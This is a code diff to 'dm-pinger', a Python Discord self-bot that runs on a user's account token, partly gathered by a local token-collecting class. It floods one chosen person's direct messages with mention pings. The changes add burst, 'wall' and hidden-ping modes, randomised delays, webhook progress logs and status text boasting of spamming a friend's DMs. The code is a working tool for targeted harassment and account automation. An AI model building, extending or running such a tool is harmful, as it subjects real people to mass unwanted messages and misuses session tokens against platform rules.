@@ -1,6 +1,5 @@
 try:
     from requests import get
-    from urllib.request import urlopen
     from random import uniform, choice
     from string import ascii_letters
     from os import system, listdir, getenv, mkdir, remove
@@ -50,6 +49,13 @@ try:
         system('pip install -U pycryptodome')
         from Crypto.Cipher import AES
     system('cls')
+    version = '0.3'
+    def gv(version):
+        a = get('https://raw.githubusercontent.com/YumYummity/dm-pinger/main/version.txt')
+        a = a.text
+        if float(a) > float(version):
+            return True
+        return False
     class gettokens:
         print(f'{Fore.GREEN} Please wait...')
         global abcdef
@@ -161,54 +167,57 @@ try:
             mkdir(self.mainDirectory)
             self.getTokens()
 
-    if EXE:
-        if notauto:
-            print('\nHow to get your token: https://www.followchain.org/find-discord-token/')
-            print('The token will not be used for anything other than spamming a friend.\n')
-            token = input(f'{Fore.LIGHTBLUE_EX}TOKEN (exe version): {Fore.RESET}') #comment this for non exe version if u want
-        else:
-            gettokens()
-            a = True
-            f = False
-            ab = False
-            while a:
-                for i in abcdef:
-                    print(f'{Fore.GREEN}- ' + i[0])
-                    print(f'{Fore.GREEN}- CustomToken')
-                    if ab:
-                        print(f'{Fore.RED}\n\nThat is not a account. Please include the discriminator, and use proper capitalization. (Example: User#0000)\nIf inputting a token, please use a valid token.')
-                        ab = False
-                    inputt = input(f'\n{Fore.LIGHTBLUE_EX}Please choose a account to use: {Fore.RESET}')
-                    for x in abcdef:
-                        if inputt  == str(x[0]):
-                            a = False
-                            token = x[1]
-                            f = True
-                            break
-                    if not f:
-                        if str(inputt) == 'CustomToken':
-                            print('\nHow to get your token: https://www.followchain.org/find-discord-token/')
-                            print('The token will not be used for anything other than spamming a friend.\n')
-                            token = input(f'{Fore.LIGHTBLUE_EX}TOKEN (exe version): {Fore.RESET}')
-                            def checkToken(token: str) -> bool:
-                                if get("https://discord.com/api/v9/auth/login",
-                                    headers={"Authorization": token}).status_code == 200:
-                                    return True
-                                else:
-                                    return False
-                            if checkToken(token):
-                                def addTokenData(token: str) -> None:
-                                    data = get('https://discordapp.com/api/v9/users/@me',
-                                            headers={"Authorization": token}).json()
-                                    global abcdef
-                                    abcdef = abcdef + [[f"{data['username']}#{data['discriminator']}", token]]
-                                addTokenData(token)
-                                a = False
-                                f = True
+    if notauto:
+        if gv(version):
+            print(f'{Fore.RED} An update is available on github:{Fore.YELLOW} https://github.com/YumYummity/dm-pinger/{Fore.RESET}\n')
+        print('\nHow to get your token: https://www.followchain.org/find-discord-token/')
+        print('The token will not be used for anything other than spamming a friend.\n')
+        token = input(f'{Fore.LIGHTBLUE_EX}TOKEN: {Fore.RESET}')
+    else:
+        gettokens()
+        if gv(version):
+            print(f'{Fore.RED} An update is available on github:{Fore.YELLOW} https://github.com/YumYummity/dm-pinger/{Fore.RESET}\n')
+        a = True
+        f = False
+        ab = False
+        while a:
+            for i in abcdef:
+                print(f'{Fore.GREEN}- ' + i[0])
+                print(f'{Fore.GREEN}- CustomToken')
+                if ab:
+                    print(f'{Fore.RED}\n\nThat is not an valid account. Please include the discriminator, and use proper capitalization. (Example: User#0000)\nIf inputting an token, please use a valid token.')
+                    ab = False
+                inputt = input(f'\n{Fore.LIGHTBLUE_EX}Please choose an account to use: {Fore.RESET}')
+                for x in abcdef:
+                    if inputt  == str(x[0]):
+                        a = False
+                        token = x[1]
+                        f = True
+                        break
+                if not f:
+                    if str(inputt) == 'CustomToken':
+                        print('\nHow to get your token: https://www.followchain.org/find-discord-token/')
+                        print('The token will not be used for anything other than spamming a friend.\n')
+                        token = input(f'{Fore.LIGHTBLUE_EX}TOKEN: {Fore.RESET}')
+                        def checkToken(token: str) -> bool:
+                            if get("https://discord.com/api/v9/auth/login",
+                                headers={"Authorization": token}).status_code == 200:
+                                return True
                             else:
-                                ab = True
+                                return False
+                        if checkToken(token):
+                            def addTokenData(token: str) -> None:
+                                data = get('https://discordapp.com/api/v9/users/@me',
+                                        headers={"Authorization": token}).json()
+                                global abcdef
+                                abcdef = abcdef + [[f"{data['username']}#{data['discriminator']}", token]]
+                            addTokenData(token)
+                            a = False
+                            f = True
                         else:
                             ab = True
+                    else:
+                        ab = True
             
     print('Init done. Finished: modules and client.')
 
@@ -243,30 +252,84 @@ try:
                 weblogging = False
             if weblogging:
                 try:
-                    intervalah = input(f'{Fore.LIGHTBLUE_EX}\nEvery _ many pings you want a log to be sent:{Fore.RESET} ')
+                    intervalah = input(f'{Fore.LIGHTBLUE_EX}Every _ many pings you want a log to be sent:{Fore.RESET} ')
                     intervalah = int(intervalah)
                     if intervalah == 0:
                         raise ZeroDivisionError('Interval cannot be 0.')
                 except:
                     print(f'{Fore.RED}Invalid input. Using default 10.')
                     intervalah = 100
-            else:
-                intervalah = 1
+            intervalah = 1
+            global amount
             try:
-                amount = input(f'\n{Fore.LIGHTBLUE_EX}How many maximum pings do you want to be sent?{Fore.RESET} ')
+                an = '\n'
+                if weblogging:
+                    an = ''
+                amount = input(f'\n{Fore.LIGHTBLUE_EX}{an}How many maximum pings do you want to be sent?{Fore.RESET} ')
                 amount = int(amount)
             except:
                 print(f'{Fore.RED}Invalid input. Using default 1000.')
                 amount = 1000
-            try:
-                delaya = input(f'\n{Fore.LIGHTBLUE_EX}How long between messages (in seconds)? Choose a value between 1.5-20.0, higher values is recommended for longer periods:{Fore.RESET} ')
-                delaya = float(delaya)
-                if delaya < 1.5 or delaya > 20:
-                    raise TypeError('no not valid range')
-            except:
-                print(f'{Fore.RED}Invalid input. Using default 1')
-                delaya = 1.5
+            a = True
+            f = False
+            ab = False
+            options = {
+                '0': ['Normal','Ping with an interval.'],
+                '1': ['Burst', 'Ping in bursts of 5.'],
+                '2': ['Slow', 'Ping with a super slow delay (20-120 second delay)'],
+                '3': ['Wall', 'A wall of pings. Same amount of messages.'],
+                '4': ['Hidden', 'A message that has a hidden ping.']
+#                '5': ['Custom', 'Use a custom message!'] - COMING SOON
+            }
+            print('\n')
+            while a:
+                for i in options:
+                    print(f'{Fore.GREEN}{i} - {(options[i])[0]}\n{Fore.YELLOW}{(options[i])[1]}')
+                if ab:
+                    print(f'{Fore.RED}\n\nThat is not an valid option.')
+                    ab = False
+                inputtt = input(f'\n{Fore.LIGHTBLUE_EX}Please choose an option to use: {Fore.RESET}')
+                for x in options:
+                    if inputtt  == str(x) or inputtt == str((options[x])[0]) or inputtt == str((options[x])[1]):
+                        a = False
+                        option = (str((options[x])[0])).lower()
+                        f = True
+                        if option == 'burst':
+                            amount = int(amount/5)
+                            if amount == 0:
+                                amount = 1
+                        break
+                    else:
+                        ab = True
+            if option != 'burst' and option != 'slow':
+                try:
+                    delaya = input(f'\n{Fore.LIGHTBLUE_EX}How long between pings (in seconds)? Choose a value between 1.5-20.0, higher values is recommended for longer periods:{Fore.RESET} ')
+                    delaya = float(delaya)
+                    if delaya < 1.5 or delaya > 20:
+                        raise TypeError('no not valid range')
+                except:
+                    print(f'{Fore.RED}Invalid input. Using default 1.5{Fore.RESET}')
+                    delaya = 1.5
+            elif option == 'burst':
+                try:
+                    delaymini = input(f'\n{Fore.LIGHTBLUE_EX}How long between ping bursts (in seconds)? Choose a value between 6-20.0, higher values is recommended for longer periods:{Fore.RESET} ')
+                    delaymini = float(delaymini)
+                    if delaymini < 6 or delaymini > 20:
+                        raise TypeError('no not valid range')
+                except:
+                    print(f'{Fore.RED}Invalid input. Using default 6.0{Fore.RESET}')
+                    delaymini = 6.0
+            elif option == 'slow':
+                try:
+                    delaya = input(f'\n{Fore.LIGHTBLUE_EX}How long between pings (in seconds)? Choose a value between 20.0-120.0:{Fore.RESET} ')
+                    delaya = float(delaya)
+                    if delaya < 20.0 or delaya > 120.0:
+                        raise TypeError('no not valid range')
+                except:
+                    print(f'{Fore.RED}Invalid input. Using default 20.0{Fore.RESET}')
+                    delaya = 20.0
             async def logs(dmn):
+                global amount
                 if weblogging:
                     webhooka = Webhook(url=webhookab[0])
                     embed = Embed(title='Logging')
@@ -276,7 +339,10 @@ try:
                     except:
                         dmnao = dmn
                     if type(dmnao) == int:
-                        etaa = str(int((amount-int(dmnao))*delaya)) + ' seconds'
+                        if option != 'burst':
+                            etaa = str(int((amount-int(dmnao))*delaya)) + ' seconds'
+                        else:
+                            etaa = str(int((amount-int(dmnao))*delaymini)) + ' seconds'
                         embed.add_field(name='Ping Counter', value=f'Pings: {dmn}\nETA: `{etaa}`')
                     else:
                         embed.add_field(name='Logs', value=f'{dmn}')
@@ -285,58 +351,125 @@ try:
                         embed=embed
                     )
             pings = 0
-            ra = delaya/14
-            rb = delaya/8
+            if option == 'burst':
+                ra = delaymini/14
+                rb = delaymini/8
+            else:
+                ra = delaya/14
+                rb = delaya/8
             client_id = '1031332954670116914'
             RPC = None
             async def start(self):
                 nonlocal pings
                 nonlocal RPC
+                global amount
+                optiontwo = {
+                    'normal': f'{inputt.mention} ping',
+                    'burst': f'{inputt.mention} ping',
+                    'slow': f'{inputt.mention} ping',
+                    'wall': f'{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}{inputt.mention}',
+                    'hidden': f':skull: ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||{inputt.mention}'
+                }
+                for y in optiontwo:
+                    if option == y:
+                        messagea = optiontwo[y]
                 print('Starting in 5 seconds!')
                 await sleep(2.5)
                 loop = get_event_loop()
                 await sleep(2.5)
                 RPC = AioPresence(client_id, loop=loop)
-                await RPC.connect()
-                eta = str(amount*delaya) + ' seconds'
+                try:
+                    await RPC.connect()
+                except Exception as e:
+                    print(f'RPC could not start: {e}')
+                    RPC = False
+                if option != 'burst':
+                    eta = str(amount*delaya) + ' seconds'
+                else:
+                    eta = str(amount*delaymini) + ' seconds'
                 print(f'\nPinging started! ETA: {eta}\n')
                 await logs(f'Pinging started! ETA: `{eta}`')
                 # editing buttons is a violation of LICENSE.md
-                buttons = [{"label": 'DM-Pinger', "url": "https://github.com/YumYummity/dm-pinger/releases/v0.1"}, {"label": "Github", "url": "https://github.com/YumYummity/dm-pinger/"}]
+                buttons = [{"label": 'DM-Pinger', "url": "https://github.com/YumYummity/dm-pinger/releases/latest"}, {"label": "Github", "url": "https://github.com/YumYummity/dm-pinger/"}]
                 picl = ['ping', 'ping1', 'ping2']
                 start = time()
-                pi = 0 #choose 0-2 for different images
+                pi = 0 #choose 0 or 1 for different images, 2 is the evil discord STATUS automatically included
+                async def divisible_by(x, y):
+                    if (x % y) == 0:
+                        return True
+                    else:
+                        return False
                 for p in range(amount):
-                    try:
-                        await inputt.send(f'{inputt.mention} ping')
-                    except Forbidden:
-                        return 'blocked'
-                    except HTTPException:
-                        return 'blocked'
-                    pings = pings + 1
-                    await RPC.update(state='Spamming my friend\'s DMs',details=f'Pings sent: {pings}', buttons=buttons,small_image=picl[pi],start=start)
-                    sign = choice(['+', '-'])
-                    evex = str(delaya) + str(sign) + str(uniform(ra, rb))
-                    delayb = eval(evex)
-                    print(f'Ping sent. Delay used: {delayb}')
-                    await sleep(delayb)
-                    async def divisible_by(x, y):
-                        if (x % y) == 0:
-                            return True
+                    if option != 'burst':
+                        try:
+                            if option != 'hidden':
+                                if (await divisible_by(pings, 5)):
+                                    await inputt.send(f'{messagea}\n**DM-Pinger by YumYummity - <https://github.com/YumYummity/dm-pinger>**')
+                                else:
+                                    await inputt.send(f'{messagea}\n**DM-Pinger**')
+                            else:
+                                if (await divisible_by(pings, 5)):
+                                    await inputt.send(f'**DM-Pinger by YumYummity - <https://github.com/YumYummity/dm-pinger>**\n{messagea}')
+                                else:
+                                    await inputt.send(f'**DM-Pinger**\n{messagea}')
+                        except Forbidden:
+                            return 'blocked'
+                        except HTTPException:
+                            return 'blocked'
+                        pings = pings + 1
+                        if not RPC:
+                            pass
                         else:
-                            return False
-                    if (await divisible_by(pings, intervalah)):
-                        await logs(pings)
+                            await RPC.update(state='Spamming my friend\'s DMs',details=f'Pings sent: {pings}', buttons=buttons,small_image=picl[2],start=start,large_image=picl[pi])
+                        sign = choice(['+', '-'])
+                        evex = str(delaya) + str(sign) + str(uniform(ra, rb))
+                        delayb = eval(evex)
+                        print(f'Ping sent. Delay used: {delayb}')
+                        await sleep(delayb)
+                        if (await divisible_by(pings, intervalah)):
+                            await logs(pings)
+                    elif option == 'burst':
+                        for p in range(int(amount/5)):
+                            for i in range(5):
+                                try:
+                                    if (await divisible_by(pings, 5)):
+                                        await inputt.send(f'{messagea}\n**DM-Pinger by YumYummity - <https://github.com/YumYummity/dm-pinger>**')
+                                    else:
+                                        await inputt.send(f'{messagea}\n**DM-Pinger**')
+                                except Forbidden:
+                                    return 'blocked'
+                                except HTTPException:
+                                    return 'blocked'
+                                pings = pings + 1
+                        if not RPC:
+                            pass
+                        else:
+                            await RPC.update(state='Spamming my friend\'s DMs',details=f'Pings sent: {pings}', buttons=buttons,small_image=picl[2],start=start,large_image=picl[pi])
+                        sign = choice(['+', '-'])
+                        evex = str(delaymini) + str(sign) + str(uniform(ra, rb))
+                        delayb = eval(evex)
+                        print(f'Ping sent. Delay used: {delayb}')
+                        await sleep(delayb)
+                        if (await divisible_by(pings, intervalah)):
+                            await logs(pings)
                 print('\n\nFinished sending pings!')
-                await logs(f'Finished sending pings! `{pings}`')
+                await logs(f'Finished sending pings! `{pings}` sent')
                 await sleep(20)
-                await RPC.clear()
+                if not RPC:
+                    pass
+                else:
+                    await RPC.clear()
             t = await start(self)
             if t == 'blocked':
                 await logs(f'Your friend blocked you! Pings sent: `{pings}`')
                 print(f'{Fore.RED}Your friend blocked you! Pings sent: `{pings}`')
+                await logs('Your message could not be delivered. This is usually because you don\'t share a server with the recipient or the recipient is only accepting direct messages from friends. You can see the full list of reasons here: https://support.discord.com/hc/en-us/articles/360060145013')
+                print(f'{Fore.RED}Your message could not be delivered. This is usually because you don\'t share a server with the recipient or the recipient is only accepting direct messages from friends. You can see the full list of reasons here: https://support.discord.com/hc/en-us/articles/360060145013')
                 await sleep(20)
-                await RPC.clear()
+                if not RPC:
+                    pass
+                else:
+                    await RPC.clear()
     cl = client()
     cl.run(token)
 except Exception as e:
